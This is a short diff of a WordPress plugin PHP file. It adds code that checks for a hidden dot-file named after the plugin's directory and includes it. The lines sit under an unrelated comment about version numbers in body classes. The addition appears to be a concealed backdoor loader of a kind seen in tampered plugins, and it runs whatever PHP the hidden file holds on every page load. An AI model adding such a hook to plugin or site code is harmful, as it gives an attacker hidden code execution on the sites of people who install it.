@@ -1,6 +1,10 @@
 <?php
 
 // plugin version number for body classes
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function agro_plugin_version($classes)
 {
     $data = get_plugin_data(__FILE__);
